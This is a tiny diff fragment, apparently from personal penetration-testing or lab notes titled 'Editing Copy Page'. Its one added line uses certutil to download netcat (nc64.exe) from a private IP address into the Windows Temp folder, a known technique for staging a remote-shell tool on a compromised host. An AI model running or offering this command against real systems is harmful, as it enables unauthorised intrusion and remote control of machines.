@@ -1,7 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-
+certutil -urlcache -split -f http://192.168.45.186/nc64.exe C:/Windows/Temp/nc.exe
 ```
 
 ```
